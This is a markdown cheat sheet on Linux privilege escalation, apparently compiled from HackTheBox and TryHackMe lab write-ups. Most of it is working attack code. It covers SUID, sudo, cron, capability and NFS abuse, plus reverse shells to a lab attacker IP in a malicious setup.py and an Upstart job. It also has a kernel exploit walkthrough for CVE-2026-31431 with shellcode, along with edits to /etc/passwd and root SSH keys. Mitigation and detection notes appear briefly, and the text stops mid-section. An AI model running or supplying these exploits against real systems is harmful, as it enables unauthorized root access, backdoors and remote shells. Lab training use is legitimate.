---
title: "Linux Privilege Escalation"
type: technique
tags: [0xdf, exploitation, git-poc, htb, linux, post-exploitation, privilege-escalation, thm]
phase: post-exploitation
date_created: 2026-05-08
date_updated: 2026-07-02
sources: [thm-linux-privesc, thm-python-lib-hijack, thm-lxd-gamingserver, git-copyfail-go, git-cve-2026-31431, 0xdf-linux-privesc]
---

# Linux Privilege Escalation

> Kernel/local LPE CVE catalog (Dirty*/PwnKit/Looney/nf_tables + Rafael Tinoco's 2026 page-cache LPE set + Windows/AD privesc): [[privesc-exploit-arsenal]]. Treat kernel CVEs as a last resort, verify patch level first.

## What it is

Linux privilege escalation is the process of gaining higher-level permissions (typically root) on a Linux system after initial access as a low-privilege user, by exploiting misconfigurations, weak permissions, vulnerable software, or kernel bugs.

## How it works

The system grants elevated access when an attacker abuses a mechanism that was intended for legitimate use: a SUID binary, a sudo rule, a writable cron script, or a kernel vulnerability. The escalation typically results in a root shell or a shell as another privileged user.

## Prerequisites

- Low-privilege shell on the target
- Ability to read files and run commands
- Time to enumerate the system

---

## Methodology

### Step 1: System Enumeration

```bash
# OS and kernel version
uname -a
cat /etc/os-release
cat /proc/version

# Current user and groups
id
whoami
groups

# Hostname and network
hostname
ip a
cat /etc/hosts

# Environment variables (look for LD_PRELOAD, PATH)
env
```

### Step 2: Run Automated Enumeration

```bash
# LinPEAS (most comprehensive)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or upload and run:
sh linpeas.sh | tee linpeas_output.txt

# LinEnum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh && ./LinEnum.sh

# Linux Exploit Suggester
wget https://github.com/The-Z-Labs/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh && ./linux-exploit-suggester.sh
```

### Step 3: Manual Checks (see sections below)

---

## Key Attack Vectors

### SUID / SGID Binaries

SUID binaries run as the file owner (often root) regardless of who executes them.

```bash
# Find all SUID/SGID binaries
find / -type f -perm -04000 -ls 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Check GTFOBins for exploitation methods
# https://gtfobins.github.io/
```

**Example — SUID environment variable hijacking:**

```bash
# Check what binaries a SUID file calls without absolute path
strings /usr/local/bin/suid-env

# Create a malicious version of the called binary
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
gcc /tmp/service.c -o /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/suid-env
```

**Example — Shared object injection via SUID:**

```bash
# Find missing shared objects
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"

# Create the missing .so file
mkdir -p /home/user/.config
cat > /home/user/.config/libcalc.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
EOF
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```

**Example — SUID `jjs` (Nashorn) — Mango (Medium):**

`jjs` is the Java Nashorn JavaScript REPL. When set SUID root (or running as a higher-privileged user), its Java I/O APIs run as that user. Drop an SSH key into `/root/.ssh/`:

```bash
ls -la /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
# -rwsr-sr-- 1 root admin ...

/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

```javascript
// in the jjs REPL:
var FileWriter = Java.type("java.io.FileWriter");
var fw = new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAA... attacker@kali");
fw.close();
```

```bash
ssh -i ~/.ssh/id_rsa root@target
```

Read-only variant (read `/root/root.txt`):

```javascript
var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
print(br.readLine());
```

---

### Sudo Misconfigurations

```bash
# List allowed sudo commands
sudo -l
```

**Exploit sudo with GTFOBins** — visit https://gtfobins.github.io/ for the specific binary.

**Example — sudo zip:**

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

**Example — sudo yum (plugin injection):**

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF
cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF
cat >$TF/y.py<<EOF
import os, yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF
sudo yum -c $TF/x --enableplugin=y
```

**LD_PRELOAD with sudo (if env_keep includes LD_PRELOAD):**

```c
// save as /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so apache2
```

#### From the Wild — HTB Easy/Medium sudo chains

| Machine | Rule | Technique |
|---------|------|-----------|
| Traverxec (Easy) | `sudo journalctl -n5 -unostromo.service` | shrink TTY so `journalctl` invokes `less`, then `!/bin/bash` |
| Academy (Easy) | `(ALL) /usr/bin/composer` | `composer.json` `scripts` entry runs as root |
| Knife (Easy) | `NOPASSWD: /usr/bin/knife` | `knife exec -E "exec '/bin/bash'"` |
| CozyHosting (Easy) | `(root) /usr/bin/ssh *` | `ssh -o ProxyCommand=` runs arbitrary commands as root |
| Meta (Medium) | `NOPASSWD: /usr/bin/neofetch ""` + `env_keep+=XDG_CONFIG_HOME` | malicious `~/.config/neofetch/config.conf` |
| SneakyMailer (Medium) | `NOPASSWD: /usr/bin/pip3` | `setup.py` with `cmdclass={'install': Exploit}` runs during `sudo pip3 install .` |
| Previous (Medium) | `sudo /usr/bin/terraform apply` | `~/.terraformrc` `dev_overrides` points provider at user-writable dir |
| Admirer (Easy) | `SETENV` on `/opt/scripts/admin_tasks.sh` | `sudo PYTHONPATH=/var/tmp ...` hijacks an `import shutil` |
| Armageddon (Easy) | `NOPASSWD: /usr/bin/snap install *` | install hook in attacker-built `.snap` runs as root |
| Blunder (Easy) | `(ALL, !root) /bin/bash` | `sudo -u#-1 /bin/bash` (CVE-2019-14287) |
| PermX (Easy) | `NOPASSWD: /opt/acl.sh` | symlink + `setfacl` to grant write on `/etc/passwd` |
| Photobomb (Easy) | `SETENV` on `/opt/cleanup.sh` calling bare `find` | `sudo PATH=$PWD:$PATH /opt/cleanup.sh` |
| Previse (Easy) | `sudo /opt/scripts/access_backup.sh` (no `secure_path`) | `gzip` shim in `/dev/shm` via `PATH` prefix |

**Example — sudo journalctl (Traverxec):**

```bash
sudo -l    # /usr/bin/journalctl
# shrink terminal so journalctl uses less as pager
sudo /usr/bin/journalctl -n5 -unostromo.service
# in less:
!/bin/bash
```

**Example — sudo composer (Academy):**

```bash
TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > $TF/composer.json
sudo composer --working-dir=$TF run-script x
```

**Example — sudo knife exec (Knife):**

```bash
sudo knife exec -E "exec '/bin/bash'"
# alternate via vim:
sudo knife data bag create 0xdf output -e vim
# then in vim:
:!/bin/bash
```

**Example — sudo ssh ProxyCommand (CozyHosting):**

```bash
# ProxyCommand runs before the SSH connection — as root
sudo ssh -o ProxyCommand='cp /bin/bash /tmp/0xdf' localhost
sudo ssh -o ProxyCommand='chmod 6777 /tmp/0xdf' localhost
/tmp/0xdf -p
# or single-shot via GTFOBins:
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

**Example — sudo neofetch + XDG_CONFIG_HOME (Meta):**

```bash
mkdir -p ~/.config/neofetch
echo 'exec /bin/sh' > ~/.config/neofetch/config.conf
XDG_CONFIG_HOME=~/.config sudo neofetch
```

**Example — sudo pip3 install with malicious setup.py (SneakyMailer):**

```python
# setup.py
from setuptools import setup
from setuptools.command.install import install
import os

class Exploit(install):
    def run(self):
        os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'")

setup(name='evil', version='1.0', cmdclass={'install': Exploit})
```

```bash
cd /dev/shm/evil
sudo pip3 install .
```

**Example — sudo PYTHONPATH hijack via SETENV (Admirer):**

The `sudoers` rule uses `SETENV` (per-command env-passing), distinct from `env_keep`. The wrapped script imports a library from a directory you control:

```bash
# /opt/scripts/admin_tasks.sh option 6 -> python /opt/scripts/backup.py
# backup.py: import shutil; shutil.make_archive(...)
cat > /var/tmp/shutil.py << 'EOF'
import os
def make_archive(*a, **kw):
    os.system("cp /bin/bash /tmp/0xdf && chmod 6777 /tmp/0xdf")
EOF
sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
/tmp/0xdf -p
```

**Example — sudo terraform with `dev_overrides` (Previous):**

```bash
cat > ~/.terraformrc << 'EOF'
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
EOF

cat > /dev/shm/terraform-provider-examples << 'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/0xdf
chmod 6777 /var/tmp/0xdf
EOF
chmod +x /dev/shm/terraform-provider-examples

sudo terraform -chdir=/opt/examples apply
/var/tmp/0xdf -p
```

Alternate **terraform → cron.d** primitive: with `TF_VAR_source_path` pointing at a symlinked staging dir, terraform's `local-file` provisioner copies attacker content into `/etc/cron.d/`:

```bash
mkdir -p /dev/shm/root/examples
ln -sf /etc/cron.d/pwn docker/previous/public/examples/pwn
echo "* * * * * root touch /tmp/rootcron" > /dev/shm/root/examples/pwn
TF_VAR_source_path=/dev/shm/root/examples/pwn sudo terraform -chdir=/opt/examples apply
```

**Example — sudo snap install --devmode (Armageddon):**

`snap install --devmode` runs an arbitrary `install` hook as root, no signature required. Build the snap off-target with `snapcraft`, then:

```bash
# attacker host: build malicious snap
snapcraft init
mkdir -p snap/hooks
cat > snap/hooks/install << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... attacker@kali" >> /root/.ssh/authorized_keys
EOF
chmod a+x snap/hooks/install
snapcraft

# target: install
curl http://10.10.14.7/payload_0.1_amd64.snap -o p.snap
sudo snap install --devmode p.snap
ssh -i ~/.ssh/id_ed25519 root@target
```

Note: this is **not** the snapd-socket CVE-2019-7304 "Dirty Sock" exploit, which targets the daemon directly; this is `sudo`-delegated `snap install` abuse on a host where the daemon is patched.

---

### CVE-2019-14287 — sudo "-u#-1" bypass

Affects sudo < 1.8.28. When a rule lists `(ALL, !root)` or any `Runas_Spec` that *excludes* root but allows other users, `sudo -u#-1` (or `-u#4294967295`) is parsed as UID -1, which `setresuid()` treats as "do not change" — leaving euid at 0.

```bash
sudo -l
# (ALL, !root) /bin/bash
sudo --version  # confirm < 1.8.28
sudo -u#-1 /bin/bash
id  # uid=0(root)
```

Real chain: **HTB Blunder** (`hugo` may run `(ALL, !root) /bin/bash`, sudo 1.8.25p1).

---

### Sudo + Script Wildcard / Argument Injection

When a `sudo`-allowed script `cp`s, `rsync`s, `tar`s, or `chown`s a wildcard (`*`) glob in a directory you can write to, drop filenames that the binary mistakes for arguments. Classic short list:

| Wildcard binary | Magic filename(s) | Effect |
|-----------------|-------------------|--------|
| `cp` | `--preserve=mode`, `--target-directory=DIR` | Preserve SUID bit, redirect destination to a symlinked dir |
| `tar` | `--checkpoint=1`, `--checkpoint-action=exec=sh CMD` | Run `CMD` during tar |
| `rsync` | `-e sh CMD`, `--rsh=CMD` | Run `CMD` as transport |
| `chown` | `--reference=FILE` | Change ownership to match another file |

**Example — sudo `cp *` wildcard abuse (Dynstr — Medium):**

```bash
cd /dev/shm
echo 100 > .version          # satisfy script precondition
cp /bin/bash .
chmod 4777 bash
touch -- --preserve=mode      # `cp` interprets this as a flag
sudo /usr/local/bin/bindmgr.sh
/etc/bind/named.bindmgr/bash -p
```

Alternate primitive on the same machine — redirect the `cp` destination to `/etc/`:

```bash
cd $(mktemp -d)
cp /etc/passwd .
echo 'oxdf:$1$xxx$hash:0:0:pwned:/root:/bin/bash' >> passwd
echo 1000 > .version
touch -- '--target-directory=etc'
ln -s /etc etc
sudo /usr/local/bin/bindmgr.sh
su - oxdf
```

---

### Sudo runs an interpreter or a password-check script (Contrabando)

Three distinct, very common flaws when a `sudo` rule points at a script or an interpreter:

**(a) Interpreter arg-glob picks the vulnerable version.** A rule like `(root) NOPASSWD: /usr/bin/python* /opt/generator/app.py` uses a `*` glob, so you choose the interpreter. Pick `python2` where the others are patched, or any version whose call is injectable:
```bash
sudo /usr/bin/python2 /opt/generator/app.py
```

**(b) Python2 `input()` is `eval()`.** In Python 2, `input(prompt)` evaluates the typed text as a Python expression (`raw_input()` is the safe one). Any `sudo python2 script.py` that calls `input()` is RCE as root:
```bash
# at the input() prompt:
__import__("os").system("/bin/bash")
# non-interactive (feed answers in order: here length=12, then the eval payload):
printf '12\n__import__("os").system("id; cat /root/root.txt")\n' | sudo /usr/bin/python2 /opt/generator/app.py
```

**(c) Unquoted `[[ == ]]` in a sudo bash script is a glob oracle.** A check `if [[ $secret == $user_input ]]` with `$user_input` UNQUOTED treats your input as a glob, so `*` matches anything and a prefix probe `known*` leaks the secret one char at a time. Blind brute:
```bash
# vault runs as root via:  sudo -n /usr/bin/bash /usr/bin/vault
known=""
for ((i=0;i<40;i++)); do for c in {a..z} {A..Z} {0..9} _ - .; do
  echo "${known}${c}*" | sudo -n /usr/bin/bash /usr/bin/vault | grep -q matched && { known="${known}${c}"; break; }
done; done; echo "secret=$known"
```
The leaked secret is frequently the user's own sudo/login password (reuse for `su`/`sudo`). Fix: quote the RHS (`"$user_input"`). See [[password-cracking]] for the seed-mutation angle.

---

### Sudo + ACL Abuse on System Files

If a `sudo` rule runs `setfacl` (or a script that calls it) and accepts a user-controlled path, drop a symlink in the expected target to redirect the ACL grant onto a sensitive file.

**Example — PermX (Easy):**

```bash
sudo -l
# (root) NOPASSWD: /opt/acl.sh
# script: setfacl -m "u:$1:$2" "/home/mtz/$3"

ln -s /etc/passwd /home/mtz/passwd
sudo /opt/acl.sh mtz rwx passwd
# /etc/passwd is now writable by mtz
openssl passwd -1 hacker
echo 'oxdf:$1$...:0:0:pwned:/root:/bin/bash' >> /etc/passwd
su oxdf
```

Same primitive works against `/etc/sudoers` (add `oxdf ALL=(ALL) NOPASSWD: ALL`) or `/etc/crontab`.

---

### TTY Pushback (TIOCSTI) — hijack a root `su -`/shared terminal

When **root runs `su - <you>` inside a real terminal (PTY)** and you control that user's
startup files, you can push keystrokes into root's terminal via the `TIOCSTI` ioctl
(`0x5412`). `su -` loads the target user's `~/.bashrc`/`~/.profile`; from there, stuff a
command into the shared TTY input queue. When `su` returns to root's shell, root's shell
reads and executes your injected line **as root**. Classic THM Backtrack: a root cron used
paramiko to open a PTY, `su - orville`, then `zip` the webroot — orville's `.bashrc` is
attacker-controlled.

```bash
# Prepend to the low user's ~/.bashrc (BEFORE the `case $- in *i*)..return` guard, so it
# runs even for su -'s login shell). `exit\n` closes YOUR shell first so the remaining
# keystrokes are read by root's PARENT shell, not consumed by your own su session:
perl -e 'ioctl(STDIN,0x5412,$_) for split //,"exit\ncp /bin/bash /tmp/rb;chmod +s /tmp/rb\n"' 2>/dev/null
# next time root does `su - <you>`:  /tmp/rb -p   -> uid=0
```

Notes:
- **Spot it with pspy:** a per-minute `sshd: root [priv]` + `su - <user>` + interactive
  `-bash`/`landscape-sysinfo` (MOTD) = a root PTY dropping to your user. Nothing in the
  login *path* needs to be writable — only the target user's dotfiles.
- **`exit\n` prefix is required** if root's `su -` is interactive; without it your own
  interactive shell eats the injection (it runs as *you*, not root).
- **Kernel gate:** `TIOCSTI` is allowed on kernels before the `dev.tty.legacy_tiocsti=0`
  lockdown (default-off from ~6.2 / backports). 5.4/5.15 era boxes still allow it.
- Restore the dotfile afterward — the payload fires on every login and is noisy.

---

### Cron Jobs

```bash
# View system cron jobs
cat /etc/crontab
crontab -l
ls -la /etc/cron.*

# View world-writable scripts called by root's cron
find / -writable -type f 2>/dev/null | grep -v proc
```

**Example — overwrite a world-writable cron script:**

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# Wait for cron to run, then:
/tmp/bash -p
```

**Example — wildcard injection in cron (tar):**

```bash
# cron runs: tar czf /tmp/backup.tar.gz /home/user/*
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
touch /home/user/--checkpoint=1
touch '/home/user/--checkpoint-action=exec=sh runme.sh'
# Wait for cron to run:
/tmp/bash -p
```

#### Discovering crons with pspy

Many cron-based chains are invisible to `cat /etc/crontab` (e.g. systemd timers, root-owned `/etc/cron.d/*` not world-readable, services calling `cron.hourly` scripts). Use [[pspy]] to watch process exec live:

```bash
wget http://ATTACKER:8000/pspy64
chmod +x pspy64
./pspy64           # -pf for filesystem events
```

Look for `UID=0 ... CRON -f` lines followed by the child commands; that's the schedule + target script you need to abuse.

#### From the Wild — HTB Easy/Medium cron chains

| Machine | Trigger | Primitive |
|---------|---------|-----------|
| Epsilon (Medium) | root cron runs `tar` then `tar -chvf <checksum> ...` 5s later | Symlink `checksum` → `/root` between the two `tar` runs; `-h` follows the symlink and archives `/root/` |
| Slonik (Medium) | root cron `pg_basebackup` copies `/var/lib/postgresql/14/main` | Drop SUID `bash` in the live data dir; backup copies it as root-owned SUID |
| Inject (Easy) | root cron `ansible-parallel /opt/automation/tasks/*.yml` | Write a malicious YAML playbook to `tasks/`; runs as root next minute |
| Previous (Medium) | cron picks up files in `/etc/cron.d/` (terraform copy primitive lands here) | See sudo terraform example above |

**Example — tar symlink/`-h` race (Epsilon):**

```bash
# pspy shows the timing:
# UID=0 ... /usr/bin/tar -cvf /opt/backups/<rand>.tar /var/www/app/
# 5s later:
# UID=0 ... /usr/bin/tar -chvf /var/backups/web_backups/<rand>.tar /opt/backups/checksum /opt/backups/<rand>.tar

cd /opt/backups
while :; do
  if test -f checksum; then
    rm -f checksum
    ln -s /root checksum    # second tar follows symlink (-h) → archives /root/
    sleep 5
    break
  fi
  sleep 1
done

# extract the next /var/backups/web_backups/*.tar locally to read root.txt / id_rsa
cp /var/backups/web_backups/<new>.tar /dev/shm/
cd /dev/shm && tar xf <new>.tar
cat opt/backups/checksum/root.txt
```

**Example — pg_basebackup data-dir SUID drop (Slonik):**

`pg_basebackup` running as root will copy whatever's in the postgres data dir to the destination, preserving the postgres user's content as root-owned:

```bash
# as postgres:
cd ~/14/main
cp /bin/bash .
chmod 6777 bash

# wait for the next cron tick:
cd /opt/backups/current
ls -l bash    # -rwsrwsrwx 1 root root ...
./bash -p
```

**Example — Ansible playbook injection (Inject):**

If a root cron iterates over a `*.yml` glob in a directory you can write to (groups `staff`, `developer`, `ansible`, `automation`, ...), drop a playbook with a `shell:` task:

```bash
# Discover the schedule:
./pspy64
# UID=0 ... /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml

cat > /opt/automation/tasks/0xdf.yml << 'EOF'
- hosts: localhost
  tasks:
    - name: privesc
      shell: cp /bin/bash /tmp/0xdf; chmod 4755 /tmp/0xdf
EOF

# wait for cron:
/tmp/0xdf -p
```

---

### Writable Init / Service Files

Systemd is the common case (see cheatsheet) but older Ubuntu still ships **Upstart** (`/etc/init/*.conf`). If group permissions on these configs are loose and a `sudo /sbin/initctl` rule exists, you can add an `exec` line to a job and start it as root.

**Example — Upstart abuse (Spectra — Easy):**

```bash
# /etc/init/test.conf owned root:developers, mode 664
id    # uid=1000(katie) groups=...,developers

cat >> /etc/init/test.conf << 'EOF'
script
  exec /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
end script
EOF

sudo initctl start test
```

For modern systemd targets, see the cheatsheet `## Writable Systemd Services / Timers` section.

---

### Capabilities

Linux capabilities allow processes to have specific root-equivalent privileges without full root.

```bash
# Find binaries with capabilities (run from low-priv shell — /usr/sbin/getcap may need PATH)
/usr/sbin/getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
```

**cap_setuid+ep on python** (Cap — Easy):

```bash
getcap /usr/bin/python3.8
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

python3 -c 'import os, pty; os.setuid(0); pty.spawn("/bin/bash")'
```

**cap_setuid+ep on perl + AppArmor profile bypass** (Nunchucks — Easy):

`/usr/bin/perl` with `cap_setuid+ep` would normally yield root via `perl -e '...; exec "/bin/sh"'`. On Ubuntu, the `usr.bin.perl` AppArmor profile may block direct `perl -e` execution. Bypass by writing a shebang script and executing it directly — AppArmor matches by binary path, not script path:

```bash
getcap /usr/bin/perl
# /usr/bin/perl = cap_setuid+ep

# direct -e is blocked by AppArmor on some hosts:
perl -e 'use POSIX(setuid); POSIX::setuid(0); exec "/bin/sh";'   # fails

# shebang-script bypass:
cat > /tmp/a.pl << 'EOF'
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/a.pl
/tmp/a.pl
```

**cap_sys_ptrace+ep on gdb** (Faculty — Medium):

`cap_sys_ptrace` lets a binary attach to any process (even root-owned) and read/write memory. Use it to inject shellcode at the instruction pointer of a long-running root process.

```bash
# Identify the cap and a candidate root pid:
getcap /usr/bin/gdb
# /usr/bin/gdb = cap_sys_ptrace+ep

# Find a long-running root process
ps -ef | grep ^root

# Generate Linux x64 bind shell shellcode (msfvenom on attacker):
msfvenom -p linux/x64/shell_bind_tcp LPORT=5600 -f raw -o /tmp/sc
# Convert raw bytes to 8-byte words for gdb 'set {long}' (see Faculty writeup)

# On target:
gdb -q -p <root_pid>
```

```gdb
# Inside gdb — write shellcode at the saved instruction pointer:
set {long}($rip+0)  = 0xWORD0
set {long}($rip+8)  = 0xWORD1
# ... (continue until shellcode fully written, padded to 8-byte boundary with 0xcc)
c
```

```bash
# Connect to bind shell:
nc 127.0.0.1 5600
```

**Other useful capabilities:**

```bash
# cap_dac_read_search on tar — read any file
/usr/bin/tar -cf /dev/stdout /etc/shadow | tar -x -O

# cap_dac_override on a copy of bash — overwrite root-only files
./bash -c 'echo root:0:0::/root:/bin/bash > /etc/passwd'   # if cap_dac_override is set

# cap_net_raw — craft arbitrary packets (not usually privesc but enables sniffing)
```

#### From the Wild — HTB Easy/Medium capabilities

| Machine | Binary | Capability | Trick |
|---------|--------|------------|-------|
| Cap (Easy) | `/usr/bin/python3.8` | `cap_setuid,cap_net_bind_service+eip` | `os.setuid(0); pty.spawn("bash")` |
| Nunchucks (Easy) | `/usr/bin/perl` | `cap_setuid+ep` | shebang script avoids AppArmor `usr.bin.perl` profile |
| Faculty (Medium) | `/usr/bin/gdb` | `cap_sys_ptrace+ep` | attach to root pid, write shellcode at `$rip`, `c` |

---

### Kernel Exploits

```bash
# Check kernel version
uname -r
cat /proc/version

# DirtyCow (CVE-2016-5195) — kernel 2.6.22 to 3.x/4.x
gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w
./c0w
passwd  # now runs as root
```

See also **Dirty Frag** (CVE-2026-43284 / CVE-2026-43500) — page-cache LPE via xfrm-ESP + RxRPC, no race condition, affects kernels from 2017 up to mainline (CVE-2026-43500 unpatched as of 2026-05-09).

---

### CVE-2026-31431 — Copy Fail (AF_ALG Page-Cache Overwrite LPE)

**Root cause:** The 2017 `algif_aead` in-place optimization allows `splice(2)` to inject read-only page-cache pages as the writable *destination* of a kernel crypto operation. This means any unprivileged user can overwrite arbitrary read-only files in the kernel's page cache without modifying the file on disk.

**Affected kernels:**
```
Floor:   v4.14  (commit 72548b093ee3, August 2017)
Ceiling: April 2026 (commit a664bf3d603d — fix separates src/dst scatterlists)
All major distros (Ubuntu, RHEL, SUSE, Amazon Linux, Debian) confirmed vulnerable
at disclosure time. Distro backports began ~2026-04-29.
```

**Precise write mechanic:** `authencesn` writes the AAD's `seqno_lo` field (bytes 4–7 of the 8-byte AAD sent via `sendmsg`) into `dst[assoclen + cryptlen]` — the splice-sourced page-cache page is the destination. The 4 controllable bytes land at a deterministic offset within the page, corresponding to the `offset_src` passed to `splice()`.

**Detect (non-destructive):**
```bash
# Python detector — creates a temp sentinel file only, never touches system files
python3 test_cve_2026_31431.py
# Exit 0 = NOT vulnerable | Exit 2 = VULNERABLE | Exit 1 = test error
```

**Verify target is vulnerable (manual):**
```bash
uname -r   # must be >= 4.14 and lack the fix backport
# Check distro changelog or kernel git log for a664bf3d603d
cat /proc/crypto | grep -A5 "authencesn"   # present = AF_ALG AEAD is loaded
```

**Technique A — overwrite `/usr/bin/su` with shellcode (Go, no deps):**
```bash
# Transfer copyfail-go static binary (pre-built, supports amd64/i386/arm64/armv7l)
chmod +x copyfail-go
./copyfail-go --backup /tmp/su    # overwrites su page cache → root shell
./copyfail-go --backup /tmp/su --exec /path/to/binary  # run binary as root

# Restore su from root shell:
cat /tmp/su > /usr/bin/su && touch -r /tmp/su /usr/bin/su && rm /tmp/su
```

**Technique B — flip UID to 0 in `/etc/passwd` page cache (Python, stdlib only):**
```bash
# Requirements: user must have a 4-digit UID (1000–9999); no nscd/sssd caching
python3 exploit_cve_2026_31431.py           # dry run: patches page cache, prints next steps
python3 exploit_cve_2026_31431.py --shell   # patch + exec `su <user>` (enter your own password)

# PAM validates against /etc/shadow (unchanged), but setuid() sees UID 0 from page cache
```

**How Technique B works (step by step):**
1. Parse `/etc/passwd` on disk to find the byte offset of the UID field
2. Call `write4(PASSWD, uid_off, b"0000")`:
   - Open `/etc/passwd` read-only; `read(4096)` to prime the page cache
   - Create `AF_ALG` socket → bind `authencesn(hmac(sha256),cbc(aes))` → set zero key
   - `sendmsg([b"\x00\x00\x00\x00" + b"0000"], cmsg=[OP=DECRYPT, IV, ASSOCLEN=8], MSG_MORE)`
   - `splice(passwd_fd, pipe_w, 32, offset_src=uid_off)` → `splice(pipe_r, op_fd, 32)`
   - `recv(op_fd)` → `EBADMSG` (auth fails; scratch write fired regardless)
3. Re-read `/etc/passwd` via page cache to verify `"0000"` landed
4. Confirm `pwd.getpwnam(user).pw_uid == 0` (libc reads page cache)
5. `execvp("su", ["su", user])` — enter your real password; PAM promotes to uid=0

**NSS cache caveat:** If `nscd` or `sssd` is running, `getpwnam` may return the real UID from its cache even after the page-cache patch. Kill or bypass the cache, or pick a user not cached by the daemon.

**How the shellcode exploit works (Technique A, technical):**
1. Open `/usr/bin/su` read-only
2. Create `AF_ALG` socket, bind to `authencesn(hmac(sha256),cbc(aes))`
3. Set dummy key + `authsize=4`; `accept(2)` via raw syscall (Go's `Accept` sends non-NULL addr → `ECONNABORTED`)
4. Send CMSGs: `ALG_SET_OP=DECRYPT`, `ALG_SET_IV`, `ALG_SET_AEAD_ASSOCLEN`
5. `splice(file→pipe→socket)` — moves read-only page-cache refs into crypto sink
6. `recv(socket)` — triggers in-place overwrite; repeat 4 bytes at a time
7. Execute `su` — kernel serves overwritten page-cache copy → `setuid(0)` + `execve("/bin/sh")`

**Shellcode written to su's page cache (amd64):**
```asm
_start:
    xor eax, eax; xor edi, edi; mov al, 0x69; syscall   ; setuid(0)
    lea rdi, [rel sh]; xor esi, esi; push 0x3b; pop rax; cdq; syscall  ; execve("/bin/sh")
sh: db "/bin/sh", 0
```

**Advantages over prior page-cache LPEs (DirtyCow, DirtyPipe):**
- **No race window** — straight-line logic flaw, not a TOCTOU
- **No kernel offset** — works on any distro kernel in affected range
- **No disk writes** — `stat`/checksums unchanged; forensics see nothing on-disk

**Cleanup after exploitation:**
```bash
# After Technique B --shell (from root shell, or unprivileged):
echo 3 > /proc/sys/vm/drop_caches                     # from root shell
# OR unprivileged eviction:
python3 -c "import os; fd=os.open('/etc/passwd',os.O_RDONLY); os.posix_fadvise(fd,0,0,os.POSIX_FADV_DONTNEED); os.close(fd)"
# Reboot also clears all page cache corruption
```

**Mitigation:**
```bash
# Persistent block — survives reboots; apply before patched kernel is available
sudo tee /etc/modprobe.d/disable-algif-aead.conf <<< 'install algif_aead /bin/false'
sudo rmmod algif_aead 2>/dev/null
# Verify: python3 test_cve_2026_31431.py  →  "Precondition not met", exit 0

# Permanent — apply distro kernel patch (vendor advisories from ~2026-04-29)
```

**Detection:**
```bash
# No disk write → file hash unchanged; page cache differs from disk
ss -a | grep alg                                        # AF_ALG sockets open
# Audit: socket(AF_ALG) + accept + sendmsg + splice sequence from non-root
auditctl -a always,exit -F arch=b64 -S socket -F a0=38  # 38 = AF_ALG
```

**Sources:** `raw/git/copyfail-go/` (Go, static binary), `raw/git/cve_2026_31431/` (Python, detector + /etc/passwd technique); see also [copy.fail](https://copy.fail)

---

### Weak File Permissions

**Writable /etc/passwd:**

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt newpassword

# Add root-equivalent user
echo 'hacker:$1$salt$<HASH>:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

**Readable /etc/shadow:**

```bash
ls -la /etc/shadow

# If readable: unshadow and crack
unshadow /etc/passwd /etc/shadow > /tmp/combined.txt
hashcat -m 1800 /tmp/combined.txt /usr/share/wordlists/rockyou.txt
```

---

### NFS no_root_squash

```bash
# Check NFS exports
cat /etc/exports
showmount -e <TARGET_IP>

# If no_root_squash is present:
mkdir /tmp/nfs_mount
mount -o rw,vers=2 <TARGET_IP>:/tmp /tmp/nfs_mount
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs_mount/x.c
gcc /tmp/nfs_mount/x.c -o /tmp/nfs_mount/x
chmod +s /tmp/nfs_mount/x
/tmp/x      # run from target
```

---

### PATH Hijacking

```bash
